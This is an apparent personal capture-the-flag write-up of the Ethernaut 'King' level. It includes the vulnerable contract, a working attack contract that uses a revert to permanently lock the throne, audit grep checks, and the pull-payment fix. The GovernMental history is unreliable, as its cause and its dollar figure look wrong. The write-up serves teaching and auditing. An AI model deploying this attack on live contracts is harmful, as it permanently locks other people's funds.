// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }}

    # Ethernaut — Level 9: King

**Network:** Sepolia testnet  
**Contract:** `0xfa8881364Ab9067ef9199c6461dF98ea832b2497`  
**Date completed:** June 2026

---

## What the challenge was

Become the king and make it impossible for anyone else to take the throne — even after the level is submitted.  
The contract is a "King of the Hill" game where whoever sends the most ETH becomes king, and the previous king gets refunded.

---

## What confused me

- The goal wasn't to steal ETH — it was to permanently **break** the contract
- Realised that if the king is a contract that rejects ETH, the refund fails and nobody can ever become king again

---

## Vulnerability involved

**Denial of Service via revert.**

The King contract sends ETH back to the previous king before crowning the new one:

```solidity
receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);  // ❌ refund to previous king
    king = msg.sender;
    prize = msg.value;
}
```

If the current king is a smart contract with no `receive()` or `fallback()`, the `.transfer()` call reverts. The entire transaction fails. Nobody can ever become king again — the contract is permanently bricked.

---

## How I solved it

**Step 1 — Checked the current prize**
```javascript
(await contract.prize()).toString()
// returned: 1000000000000000 (0.001 ETH)
```

**Step 2 — Deployed an attacker contract with no receive/fallback**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    constructor(address payable _target) payable {
        (bool success, ) = _target.call{value: msg.value}("");
        require(success, "Failed to become king");
    }
}
```

Deployed with **1000000000000001 wei** (1 wei more than the prize) to outbid the current king.

**Step 3 — Verified the attacker contract became king**
```javascript
await contract._king()
// returned: 0x6cb33275d49A4cBa58EfFDB64036024050420E09
```

**Step 4 — Submitted the instance**  
The submission tried to reclaim the throne, the refund to the attacker contract failed, the transaction reverted — level complete ✅

---

## How to spot this in a real audit

**Search for ETH pushes to unknown addresses:**
```bash
grep -r "\.transfer(" ./contracts/
grep -r "\.send(" ./contracts/
```

**Red flags:**
```solidity
// ❌ refunds previous participant before accepting new one
payable(previousWinner).transfer(prize);

// ❌ sends ETH to unknown addresses in a loop
for (uint i = 0; i < players.length; i++) {
    payable(players[i]).transfer(amounts[i]);
}

// ❌ critical operation depends on transfer succeeding
payable(king).transfer(msg.value);
king = msg.sender;  // never reached if transfer fails
```

**Questions to ask:**
- Does the contract send ETH to any address it didn't fully control?
- Does a critical operation depend on a transfer succeeding?
- Can a malicious contract block that transfer by reverting?
- Are there loops that send ETH to user-controlled addresses?

---

## Three flavours of DoS in real audits

**1. DoS via revert (this level)**  
A malicious contract reverts on receiving ETH, blocking the whole flow.

**2. DoS via gas limit**  
A loop over a user-controlled array grows so large it hits the block gas limit:
```solidity
// ❌ attacker bloats the array with thousands of addresses
for (uint i = 0; i < refundAddresses.length; i++) {
    refundAddresses[i].transfer(refunds[i]);
}
```

**3. DoS via block stuffing**  
An attacker fills blocks with transactions to delay time-sensitive contract logic.

---

## The fix

Never make a critical operation depend on pushing ETH to an unknown address. Use the **pull payment pattern** instead:

```solidity
// ✅ safe — users withdraw their own funds
mapping(address => uint256) public pendingReturns;

function claimRefund() public {
    uint256 amount = pendingReturns[msg.sender];
    pendingReturns[msg.sender] = 0;
    payable(msg.sender).transfer(amount);
}
```

This way a malicious contract can only block its **own** withdrawal — not everyone else's.

---

## Real world impact

The **GovernMental Ponzi contract in 2016** was bricked by this exact bug — 1100 ETH (worth ~$1.5 million at the time) got permanently locked because a refund loop failed when one address in the list couldn't receive ETH.

---

## Key takeaway

Never push ETH to unknown addresses as part of a critical flow. Any contract that makes a state change dependent on successfully transferring ETH to a user-controlled address can be permanently bricked by a malicious contract that rejects ETH.

Use pull payments — let users come and collect their funds themselves.
